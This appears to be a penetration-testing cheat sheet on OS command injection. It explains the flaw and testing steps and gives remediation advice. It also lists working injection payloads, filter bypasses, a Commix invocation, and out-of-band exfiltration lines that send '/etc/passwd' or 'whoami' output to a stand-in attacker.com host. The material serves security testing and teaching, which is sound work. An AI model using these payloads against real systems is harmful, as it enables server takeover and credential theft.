# OS Command Injection

## Overview
OS command injection occurs when user-supplied input is passed unsanitized to a system shell command. The attacker appends shell metacharacters to execute arbitrary system commands on the hosting server, potentially achieving full system compromise. It is one of the most critical web vulnerabilities — a single exploitable parameter can mean complete server takeover.

## How It Works
- The application calls a system function (e.g., `exec()`, `system()`, `popen()`, `subprocess.run()`) with user input embedded in the command string.
- Shell metacharacters like `;`, `&&`, `||`, `|`, `` ` ``, `$()` allow chaining additional commands.
- The attacker's commands execute with the same privileges as the web server process.
- Blind command injection (no output returned) can be confirmed via time delays (`sleep 5`) or out-of-band DNS/HTTP callbacks.

## Impact
- Remote code execution (RCE) on the server.
- Reading sensitive files (`/etc/passwd`, private keys, config files with credentials).
- Writing files to disk (uploading a webshell, modifying configs).
- Lateral movement to internal systems.
- Denial of service (`rm -rf /`, `fork bomb`).
- Cryptocurrency mining, botnet installation.

## Where to Look
- Features that wrap OS tools: ping/traceroute utilities, DNS lookup, `nslookup`, `whois`.
- Image/video processing features using FFmpeg, ImageMagick, or `convert`.
- File compression/decompression using `zip`, `tar`, `gzip`.
- Email sending features (sendmail, mail command wrappers).
- PDF generation using `wkhtmltopdf` or `prince`.
- Git operations, code execution sandboxes, build systems.
- Parameters named `host`, `ip`, `domain`, `filename`, `cmd`, `command`, `exec`.

## Testing Steps
1. Identify parameters that might feed into OS commands (networking tools, file processing, etc.).
2. Inject time-delay payload: `; sleep 10` — if response takes ~10 seconds, injection is confirmed.
3. Inject output-based payload: `; id` or `| id` — look for `uid=` in the response.
4. Try all metacharacters: `;`, `&&`, `||`, `|`, `` `id` ``, `$(id)`.
5. For blind injection, use out-of-band: `; nslookup $(whoami).attacker.com` or `curl http://attacker.com/$(whoami)`.
6. If input is sanitized for some chars, try alternatives: URL-encoded, newlines (`%0a`), IFS.
7. Try command substitution: `` `id` ``, `$(id)`, `${IFS}id`.
8. Test on Windows: `& whoami`, `| dir c:\`, `&& net user`.

## Payloads / Techniques
```bash
# Time-delay (blind detection)
; sleep 10
& ping -c 10 127.0.0.1
| timeout /T 10   (Windows)

# Output-based (if output reflected)
; id
| id
&& id
; whoami
; cat /etc/passwd
; ls -la /
`id`
$(id)

# OOB - DNS exfiltration (Burp Collaborator)
; nslookup `whoami`.BURP_COLLABORATOR_HOST
; curl http://BURP_COLLABORATOR_HOST/`id`
; wget http://attacker.com/`cat /etc/passwd|base64`

# Windows
& whoami
| net user
& dir c:\
& type c:\windows\win.ini

# Newline injection (when semicolons filtered)
%0a id
%0aid
%0a whoami

# IFS bypass (space filtered)
;{IFS}id
;$IFS$9id
```

```bash
# Using Commix (automated command injection)
commix --url="https://target.com/ping?host=INJECT_HERE" \
  --cookie="session=abc123" --level=3
```

## Burp Suite Tips
- Use **Burp Collaborator** (Pro) for out-of-band detection — inject DNS/HTTP ping payloads.
- Use **Intruder** to fuzz parameters with a command injection wordlist (SecLists `Fuzzing/command-injection-commix.txt`).
- **Active Scanner** (Pro) auto-tests for OS command injection.
- In **Repeater**, first try `; sleep 5` to detect blind injection via response time.

## Tools
- Commix — https://github.com/commixproject/commix (automated command injection exploitation)
- Burp Collaborator (for OOB detection)
- SecLists command injection wordlists

## Remediation
- **Never** pass user input directly to shell commands.
- Use language-native libraries instead of shell wrappers (e.g., Python's `socket` instead of `subprocess("ping ...")`).
- If shell execution is required, use parameterized APIs: `subprocess.run(["ping", "-c", "1", host], shell=False)` in Python.
- Validate input against a strict whitelist (IP address regex, hostname chars only).
- Run the web server with minimal OS privileges; use containers/sandboxes.
- Disable dangerous PHP functions: `exec`, `shell_exec`, `system`, `passthru`.

## References
https://owasp.org/www-community/attacks/Command_Injection
https://portswigger.net/web-security/os-command-injection
https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection
